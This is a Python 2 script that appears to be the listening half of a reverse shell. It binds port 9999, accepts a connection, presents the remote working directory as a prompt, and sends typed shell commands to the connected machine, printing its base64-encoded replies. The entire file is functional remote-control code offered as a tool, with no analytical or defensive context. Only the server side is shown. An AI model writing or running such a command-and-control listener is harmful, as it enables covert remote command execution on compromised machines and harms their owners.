from __future__ import print_function
import socket
import sys
import base64

#Create a socket(allows connection)

def get_base64(word):
    encoded = base64.b64encode(word)
    return encoded

def un_base64(word):
    decoded = base64.b64decode(word)
    return decoded


def socket_create():
    try:
        global host
        global port
        global s
        host =''
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket Creation error: " + str(msg))


#need to bind socket to port
def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to Port: " + str(port))
        s.bind((host, port))
        s.listen(5) #server listens for connections, 5 bad connections before refusing connection
    except socket.error as msg:
        print("Socket Binding error: " + str(msg) + "\n Retrying..")
        socket_bind()


#now to accept connections

def socket_accept():
    conn, address = s.accept() # accepts new connection
    print("Connection received from | " + "IP: " + address[0] + " | Port " + str(address[1]))

    #     #Splitting dir and show a directory with a > to be user friendly

    # dirs = conn.recv(1024)
    # dirs2 = dirs.split("/")
    # dir3 = (dirs2[-1:])
    # print(''.join([str(item) for item in dir3]),end="")
    #     #the below is the shrinking of the above commands
    print(''.join(un_base64(conn.recv(1024)).split("/")[-1:]) + " >",  end='')
    #print(dirs, end='')
    send_commands(conn)
    conn.close()

#sending commands
def send_commands(conn):

    while True:
        try:
            cmd = raw_input()
            if cmd == 'quit':
                    conn.close()
                    s.close()
                    sys.exit()
            if len(str.encode(cmd)) > 0:
            #if len(cmd.encode('ascii')) > 0:#commands in Terminal are sent in bytes
                conn.send(str.encode(cmd))

                #conn.send(cmd.encode('ascii'))
                #client_response = str(conn.recv(1024), "utf-8")
                #client_response = str(conn.recv(1024))#converting from bytes to basic character encoding
                client_response = conn.recv(1024)
                b64_decoding = un_base64(client_response)
                #print("command sent %s") % cmd
                #print("Response Received: ")
                print(b64_decoding, end='') #dont give new line character at end)
        except any:
            print("ERROR")
            conn.close()
def main():
    socket_create()
    socket_bind()
    socket_accept()

main()

